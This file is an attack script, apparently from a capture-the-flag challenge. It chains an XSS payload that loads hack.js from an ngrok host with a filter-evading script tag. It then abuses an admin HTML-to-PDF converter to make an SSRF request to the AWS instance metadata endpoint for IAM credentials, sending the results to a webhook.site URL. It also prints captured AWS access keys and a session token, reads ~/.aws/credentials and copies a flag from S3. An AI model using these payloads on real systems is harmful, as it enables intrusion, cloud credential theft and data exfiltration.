// /?alias=<scrscriptipt src="https://1fc3-122-164-175-43.in.ngrok.io/hack.js"></scrscriptipt>

// step 1
// fetch("/admin")
//     .then(
//         data => data.text()
//     )
//     .then(admin => {
//         // fetch("https://c017-122-164-175-43.in.ngrok.io/?" + JSON.stringify(admin))
//         fetch("https://webhook.site/01bcd1d7-0732-4cf2-a6f9-3a7056d8bdee", {
//             method: "POST",
//             body: JSON.stringify(admin)
//         })
//     })


// step 2

const htmlCode = "<iframe src='http://169.254.169.254/latest/meta-data/iam/security-credentials/bugbase-sales-team' width='1000px' height='1000px'></iframe>";
const xhr = new XMLHttpRequest();
xhr.open("POST", "/admin/convert");
xhr.setRequestHeader("Content-Type", "application/json");
xhr.onload = function() {
        if (xhr.status === 200) {
                const response = JSON.parse(xhr.responseText);
                fetch("https://webhook.site/01bcd1d7-0732-4cf2-a6f9-3a7056d8bdee", {
                    method: "POST",    
                    body: response.pdfLink
                })    
        }        
};        
xhr.send(JSON.stringify({htmlCode: htmlCode}));


// [{
//     "Code" : "Success",
//     "LastUpdated" : "2023-04-29T11:44:01Z",
//     "Type" : "AWS-HMAC",
//     "AccessKeyId" : "ASIA5232YEM3KTZFU2FP",
//     "SecretAccessKey" : "Vp9U1l09AptRNfyW3d9/6TNQCrsJ/dASr2dliWgR",
//     "Token" :
//     "IQoJb3JpZ2luX2VjEGwaDmFwLW5vcnRoZWFzdC0yIkgwRgIhAOcNcpOSfStWXi2Gmer2AToZMJtKwm+SfMtAMDrosLNsAiEA0m7GWcx8VGdI0AdlcBF8pkGhVuQ927YDNxaCBYCnsVcqzAUIdRABGgw5NTEwNTU4MTk1NzQiDHNakKw7eSFgMSmWkyqpBaDLr7OXZN4ChXJfa3J5IbkEzPKHpTD8BweR7lzRkbC5WnXZGKqKGXP71OvnLdrXebIROvxIC5jFbwPuOb7TVj2TtG86QQtcMgPVk6pbiLFMwLflZEKGGYRkY06eiWo+cPilNc8owz8GJYBUr6CHVRFSwEfQ8XHlDsGkdIMk/GzbjlN3wnxUPBS0mmvvzc0Hg98LPvVnRgl7ii8wuVkSJ2m9EbYiQnnZ20Ps1bBjxhXBajnDZTA0lexPxW3Bu0WHvoZFOD0hCBxvIMHJoaoOq33fdbk7J9sfnwFfs0zGOFy9b2shbRMuLPSX6Khgz9Nnr//tkY4M8Ur+36/oswGO6ah7D9pZVeKu5u9Ij5HlLIFARtzsYpQmFXszNuzbFqXiNfL7G2L5TbYQb1QtaonH2PoiCgSnROHCjupzjNZEIF5/ZC0h+ejM0+H7um0LYxjrUfzlq4/qBjrWUgEV1cNPKWhj2lA0BmK4DGtaWjPQPhgaB/SbsuoapkQDBoGmSK2zNy7sz0Nm4nJpVtQhdWONUkV9UO2JvGThIrOsGKPN1QvGDO5bGddv2Fqbx+dkXmj0Cw7hgZcJZKOenHNhXMD97I2UJjdT9T7g8C/c5szmy84Di0wg+8q4xjSYuMe3e93GLSNaosl2CJ+o7Oj3agYiPEqx/YmU3b6XWDrdG6HVRG3+XhfwFfICW50Vtfbb/j4hnVMjVz/W/gtVu/5M7ImJ03End1CEiDxSDxZ8SoqYPdIywxcSxhmYuQgKZFt6ww7FVeEoMXoRi61KwcWry51KNO9jbwzhEHOKbQzf/aI9iqp0kxrtqe4BAoWBgwYiO4bR88mKf0krOLq5VpSDH0sRKHe5SyIpf0OcoPa5fR3TTsSn5Nnl17dSsm1wgNQVwNJZpplwDHicJ3Tx0jC6hrSiBjqwAWIk4nLvbv3NEVVjsQD61wMiUWAQWa+/yRlUJHgTWcXYGLxoHiSzVkipLUWEmpEjKGiJ1volx0uXAp/K64be+Ce5whkc5z8BhpqyAkxzMwMguewjzDfioHMV4bSDcxZCntMJPIR++l6Yg3Yii3CwpqaweeXSEWlN01nC/iXy16oRLHETCeloGVu9s0y5aKIEzB+uZ3MQSdXWXIbsCCzUtzSuULtBtvHNBrM6fLwzoHRv",
//     "Expiration" : "2023-04-29T17:45:30Z"
// }]

// root@68f2a5d7e33f:/# cat ~/.aws/credentials
// [bugbase]
// aws_access_key_id = ASIA5232YEM3KTZFU2FP
// aws_secret_access_key = Vp9U1l09AptRNfyW3d9/6TNQCrsJ/dASr2dliWgR
// aws_session_token = IQoJb3JpZ2luX2VjEGwaDmFwLW5vcnRoZWFzdC0yIkgwRgIhAOcNcpOSfStWXi2Gmer2AToZMJtKwm+SfMtAMDrosLNsAiEA0m7GWcx8VGdI0AdlcBF8pkGhVuQ927YDNxaCBYCnsVcqzAUIdRABGgw5NTEwNTU4MTk1NzQiDHNakKw7eSFgMSmWkyqpBaDLr7OXZN4ChXJfa3J5IbkEzPKHpTD8BweR7lzRkbC5WnXZGKqKGXP71OvnLdrXebIROvxIC5jFbwPuOb7TVj2TtG86QQtcMgPVk6pbiLFMwLflZEKGGYRkY06eiWo+cPilNc8owz8GJYBUr6CHVRFSwEfQ8XHlDsGkdIMk/GzbjlN3wnxUPBS0mmvvzc0Hg98LPvVnRgl7ii8wuVkSJ2m9EbYiQnnZ20Ps1bBjxhXBajnDZTA0lexPxW3Bu0WHvoZFOD0hCBxvIMHJoaoOq33fdbk7J9sfnwFfs0zGOFy9b2shbRMuLPSX6Khgz9Nnr//tkY4M8Ur+36/oswGO6ah7D9pZVeKu5u9Ij5HlLIFARtzsYpQmFXszNuzbFqXiNfL7G2L5TbYQb1QtaonH2PoiCgSnROHCjupzjNZEIF5/ZC0h+ejM0+H7um0LYxjrUfzlq4/qBjrWUgEV1cNPKWhj2lA0BmK4DGtaWjPQPhgaB/SbsuoapkQDBoGmSK2zNy7sz0Nm4nJpVtQhdWONUkV9UO2JvGThIrOsGKPN1QvGDO5bGddv2Fqbx+dkXmj0Cw7hgZcJZKOenHNhXMD97I2UJjdT9T7g8C/c5szmy84Di0wg+8q4xjSYuMe3e93GLSNaosl2CJ+o7Oj3agYiPEqx/YmU3b6XWDrdG6HVRG3+XhfwFfICW50Vtfbb/j4hnVMjVz/W/gtVu/5M7ImJ03End1CEiDxSDxZ8SoqYPdIywxcSxhmYuQgKZFt6ww7FVeEoMXoRi61KwcWry51KNO9jbwzhEHOKbQzf/aI9iqp0kxrtqe4BAoWBgwYiO4bR88mKf0krOLq5VpSDH0sRKHe5SyIpf0OcoPa5fR3TTsSn5Nnl17dSsm1wgNQVwNJZpplwDHicJ3Tx0jC6hrSiBjqwAWIk4nLvbv3NEVVjsQD61wMiUWAQWa+/yRlUJHgTWcXYGLxoHiSzVkipLUWEmpEjKGiJ1volx0uXAp/K64be+Ce5whkc5z8BhpqyAkxzMwMguewjzDfioHMV4bSDcxZCntMJPIR++l6Yg3Yii3CwpqaweeXSEWlN01nC/iXy16oRLHETCeloGVu9s0y5aKIEzB+uZ3MQSdXWXIbsCCzUtzSuULtBtvHNBrM6fLwzoHRv

// aws s3 cp s3://bugbase-secret-file-storage/flag.txt . --profile bugbase
